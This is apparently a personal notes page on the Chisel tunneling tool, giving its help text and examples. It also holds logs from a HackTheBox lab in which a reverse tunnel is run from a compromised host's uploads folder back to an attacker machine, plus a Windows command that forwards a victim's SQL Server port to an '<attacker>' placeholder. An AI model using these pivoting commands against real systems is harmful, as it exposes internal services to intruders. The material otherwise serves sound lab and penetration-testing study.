---
Description: A fast TCP/UDP tunnel, transported over HTTP, secured via SSH
URL: https://github.com/jpillora/chisel
---

>[!summary]
>Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.

## Usage

```bash
$ chisel --help

  Usage: chisel [command] [--help]

  Version: X.Y.Z

  Commands:
    server - runs chisel in server mode
    client - runs chisel in client mode

  Read more:
    https://github.com/jpillora/chisel
```

Examples:

```bash
$ chisel server --port $PORT --proxy http://example.com
# listens on $PORT, proxy web requests to http://example.com

$ chisel client https://chisel-demo.herokuapp.com 3000
# connects to chisel server at https://chisel-demo.herokuapp.com,
# tunnels your localhost:3000 to the server's localhost:3000

## Remote tunnel
┌──(maoutis㉿kali)-[~/CTF/HTB/OpenSource/exploit]
└─$ ./chisel_1.7.7_linux_amd64 server -p 3000 --reverse
2022/05/23 13:20:13 server: Reverse tunnelling enabled
2022/05/23 13:20:13 server: Fingerprint fm9tUZlKfgimQ9iuIXsEGwfgoo8om8q5kAP2SBMVJb4=
2022/05/23 13:20:13 server: Listening on http://0.0.0.0:3000

/app/public/uploads $ ./chisel_1.7.7_linux_amd64 client 10.10.14.46:3000 R:3001:10.129.68.116:3000
2022/05/23 11:22:55 client: Connecting to ws://10.10.14.46:3000
2022/05/23 11:22:55 client: Connected (Latency 39.166891ms)

# Reverse port forwarding (forward to your attacker machine a victim's local port)
$ ./chisel server --port 9002 --reverse
C:\Windows\Temp>.\chisel.exe client <attacker>:9002 R:1433:localhost:1433
```